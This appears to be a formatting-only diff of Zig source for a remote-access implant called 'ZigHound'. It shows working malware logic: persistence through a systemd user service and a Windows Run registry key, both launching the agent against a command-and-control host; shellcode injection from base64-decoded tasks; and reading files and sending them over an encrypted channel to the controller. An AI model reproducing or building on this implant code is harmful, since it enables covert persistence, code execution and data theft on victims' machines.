@@ -65,7 +65,7 @@ pub const Agent = struct {
         defer self.allocator.free(service_dir);
 
         std.fs.cwd().makePath(service_dir) catch |err| {
-             if (err != error.PathAlreadyExists) return err;
+            if (err != error.PathAlreadyExists) return err;
         };
 
         const service_path = try std.fmt.allocPrint(self.allocator, "{s}/zighound.service", .{service_dir});
@@ -74,32 +74,26 @@ pub const Agent = struct {
         const file = try std.fs.cwd().createFile(service_path, .{});
         defer file.close();
 
-        const content = try std.fmt.allocPrint(self.allocator,
-            "[Unit]\n" ++
+        const content = try std.fmt.allocPrint(self.allocator, "[Unit]\n" ++
             "Description=ZigHound Agent\n" ++
             "After=network.target\n\n" ++
             "[Service]\n" ++
             "ExecStart={s} agent --host {s} --port {d} --psk {s} --jitter {d}\n" ++
             "Restart=always\n\n" ++
             "[Install]\n" ++
-            "WantedBy=default.target\n",
-            .{ exe_path, self.c2_host, self.c2_port, self.psk_str, self.jitter_ms });
+            "WantedBy=default.target\n", .{ exe_path, self.c2_host, self.c2_port, self.psk_str, self.jitter_ms });
         defer self.allocator.free(content);
 
         try file.writeAll(content);
-        
-        _ = try self.runCmd(&[_][]const u8{"systemctl", "--user", "enable", "--now", "zighound.service"});
+
+        _ = try self.runCmd(&[_][]const u8{ "systemctl", "--user", "enable", "--now", "zighound.service" });
     }
 
     fn installWindows(self: *Agent, exe_path: []const u8) !void {
-        const cmd_str = try std.fmt.allocPrint(self.allocator, "\"{s}\" agent --host {s} --port {d} --psk {s} --jitter {d}", 
-            .{ exe_path, self.c2_host, self.c2_port, self.psk_str, self.jitter_ms });
+        const cmd_str = try std.fmt.allocPrint(self.allocator, "\"{s}\" agent --host {s} --port {d} --psk {s} --jitter {d}", .{ exe_path, self.c2_host, self.c2_port, self.psk_str, self.jitter_ms });
         defer self.allocator.free(cmd_str);
 
-        _ = try self.runCmd(&[_][]const u8{
-            "reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            "/v", "ZigHound", "/t", "REG_SZ", "/d", cmd_str, "/f"
-        });
+        _ = try self.runCmd(&[_][]const u8{ "reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "ZigHound", "/t", "REG_SZ", "/d", cmd_str, "/f" });
     }
 
     fn runCmd(self: *Agent, argv: []const []const u8) !void {
@@ -169,7 +163,7 @@ pub const Agent = struct {
             defer parsed.deinit();
 
             const msg_type = parsed.value.object.get("type").?.string;
-            
+
             // Dispatch tasks
             if (std.mem.eql(u8, msg_type, "task")) {
                 const task_id = @as(u64, @intCast(parsed.value.object.get("id").?.integer));
@@ -212,7 +206,7 @@ pub const Agent = struct {
 
     fn executeInject(self: *Agent, writer: anytype, reader: anytype, task_id: u64, shellcode_b64: []const u8) !void {
         std.debug.print("[*] Inject task {d}\n", .{task_id});
-        
+
         const decoder = std.base64.standard.Decoder;
         const size = try decoder.calcSizeForSlice(shellcode_b64);
         const shellcode = try self.allocator.alloc(u8, size);
@@ -221,7 +215,7 @@ pub const Agent = struct {
 
         var success = true;
         var output: []const u8 = "Injection executed";
-        
+
         Injector.inject(shellcode) catch |err| {
             success = false;
             output = "Injection failed";
@@ -285,7 +279,7 @@ pub const Agent = struct {
         const file_content = std.fs.cwd().readFileAlloc(self.allocator, path, 10 * 1024 * 1024) catch |err| {
             const err_msg = try std.fmt.allocPrint(self.allocator, "Error reading file: {}", .{err});
             defer self.allocator.free(err_msg);
-            
+
             const payload = .{
                 .type = "file",
                 .task_id = task_id,
@@ -295,7 +289,7 @@ pub const Agent = struct {
             };
             const json = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(payload, .{})});
             defer self.allocator.free(json);
-            
+
             try self.sendEncrypted(writer, json);
             const resp = try self.receiveEncrypted(reader);
             if (resp) |r| self.allocator.free(r);
@@ -346,4 +340,3 @@ pub const Agent = struct {
         return try crypto.decrypt(self.allocator, self.key, buf);
     }
 };
- 
